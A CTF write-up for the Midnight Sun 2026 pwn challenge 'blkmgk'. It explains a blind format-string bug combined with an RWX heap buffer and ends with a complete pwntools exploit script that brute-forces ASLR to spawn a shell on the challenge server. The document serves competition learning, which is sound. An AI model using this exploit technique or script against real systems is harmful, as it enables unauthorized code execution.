---
title: "Write-up: Midnight Sun CTF 2026 (Pwn) blkmgk"
date: "2026-05-15"
tags: ["CTF", "Write-up", "Pwn"]
---

# Midnight Sun CTF 2026: blkmgk

## The Challenge

We are given a stripped 64-bit ELF binary with a remote service:

```sh
nc blkmgk.play.ctf.se 5353
```

Running `checksec` tells us:

- Full RELRO
- Stack canary
- NX enabled
- No PIE
- SHSTK
- IBT

So at first glance, it does not exactly look like a free shell.

### Initial Reversing

After opening the binary in a disassembler and doing some analysis, the main logic turned out to be quite small.

The program:

1. opens `/dev/null`
2. allocates a heap buffer of size `0x1a4`
3. runs a startup animation
4. performs a loop exactly two times

Inside that loop, it does:

```c
read(0, buf, 0x1a4);
fprintf(devnull, buf);
```

So yes, the vulnerability is exactly what it looks like:

- user-controlled format string
- passed directly into `fprintf`
- output redirected to `/dev/null`

Which means... blind format string.

At this point I thought the main pain of the challenge would be extracting useful information without seeing the printed output. But then there was another very important detail.

### The Important Detail

During startup, the program calls `mprotect` on the heap buffer and makes it `RWX`.

That changes the whole challenge.

Instead of trying to build some annoying libc-only control flow with a blind primitive, we can aim for something much simpler:

- place shellcode in the heap buffer
- use the format string to redirect control flow
- jump into our shellcode

So the problem becomes: how do we pivot execution into that heap buffer?

---

## Understanding the Stack

The call site around `fprintf` is very convenient. Right before the call, the registers look like this:

- `rdi = FILE *`
- `rsi = buf`
- `rdx = buf`
- `rcx = 1`
- `r8 = 0`
- `r9 = 0`

That means the first format-string arguments are already partially useful:

- arg1 = `buf`
- arg2 = `1`
- arg3 = `0`
- arg4 = `0`

Then the later arguments come from the stack.

By checking the stack at the `fprintf` call, we can find a very useful layout. In one local run, the important part looked like this:

```sh
arg9  = 0x7ffd4f7b25b0
arg10 = 0x401701
arg15 = 0x7ffd4f7b25e0
arg16 = 0x40174c
buf   = 0x2aacc4f0
rbp   = 0x7ffd4f7b2580
rsp   = 0x7ffd4f7b2560
```

The interesting thing is the relationship between these values:

- one argument points into the current stack frame
- another argument points to a later stack slot
- one stack slot contains the saved return address

The nice part is that we do not need to target `main`, because `main` ends with `_exit(0)` anyway. Its return address is irrelevant.

The useful target is the helper function around `fprintf`, whose saved return address is actually used immediately.

### The Return Gadget

The original saved return address was:

```text
0x40174c
```

There is also a tiny gadget at:

```text
0x40137d    pop rbp ; ret
```

If we overwrite the saved return address with `0x40137d`, then on function return:

1. `pop rbp` consumes a controlled stack value
2. `ret` uses the next stack value as the new instruction pointer

And that next stack value is already the heap buffer pointer.

So effectively we get:

```text
return -> pop rbp ; ret -> heap buffer
```

So the whole plan:

1. put shellcode at the start of the heap buffer
2. use the format string to repoint a stack pointer argument to the saved return slot
3. overwrite the saved return address with `0x40137d`
4. return into `pop rbp ; ret`
5. land in the heap shellcode

---

## The Exploit

The exploit used two writes:

- a `%hhn` write to adjust a stack pointer so it points to the saved return address
- a `%hn` write to change the saved return address from `0x40174c` to `0x40137d`

The general payload shape looked like this:

```python
sc = asm(shellcraft.sh())
payload = sc + fmt
```

In the fixed-layout local analysis, the core idea was:

```python
fmt = b'%c'*7 + b'%53953c' + b'%hn' + b'%c'*4 + b'%16513c' + b'%hn'
```

The first write repointed a stack pointer argument to the saved return slot, and the second write changed the saved return address to `0x137d` in the low 16 bits, turning `0x40174c` into `0x40137d`.

This worked and gave a shell locally.

### The Annoying Part: ASLR

As always, and as painful as it is, we do have ASLR enabled and blocking our way.

The exact low byte of the useful stack slot changes under ASLR. So the first pointer-fix write could not be hardcoded to a single value for every run.

Luckily, only the low byte mattered for the retargeting step, and the slot alignment reduced the search space a lot. So instead of needing some leak, we brute-forced the possible aligned low-byte values, as there are not a lot of them.

The final remote script:

1. sends the shellcode + format string payload
2. sends shell commands
3. repeats over 16 possible low-byte candidates until one lands

And once it lands, we get a shell and can just read the flag.

### The final exploit script

```python
import time
from pwn import asm, context, remote, shellcraft

HOST = "blkmgk.play.ctf.se"
PORT = 5353

context.arch = "amd64"
# context.log_level = "debug"

def build_payload(target_low_byte: int) -> bytes:
    shellcode = asm(shellcraft.sh())

    count = len(shellcode)
    fmt = b"%c" * 7
    count += 7

    width1 = (target_low_byte - count) % 0x100
    if width1 < 10:
        width1 += 0x100
    fmt += f"%{width1}c".encode()
    count += width1
    fmt += b"%hhn"

    fmt += b"%c" * 4
    count += 4

    width2 = (0x137D - (count % 0x10000)) % 0x10000
    if width2 < 10:
        width2 += 0x10000
    fmt += f"%{width2}c".encode()
    fmt += b"%hn"

    payload = shellcode + fmt
    assert b"\x00" not in payload
    return payload

def candidate_bytes():
    for low in range(0x08, 0x100, 0x10):
        yield low

def main():
    for low in candidate_bytes():
        print(f"[*] trying low byte 0x{low:02x}")
        io = remote(HOST, PORT)

        try:
            io.recvuntil(b"done!\n", timeout=15)
            io.sendline(build_payload(low))
            time.sleep(0.2)

            io.sendline(b"echo __SHELL__")
            data = io.recvrepeat(1.5)

            if b"__SHELL__" in data:
                print("got shell")
                io.interactive()
                return

        except EOFError:
            pass

        io.close()

    raise SystemExit("no candidate succeeded")


if __name__ == "__main__":
    main()
```

We successfully got shell on low byte `0x58` on our run.  
Flag: `midnight{1_w4s_bl1nD_bu7_n0w_I_533}`

Profit!
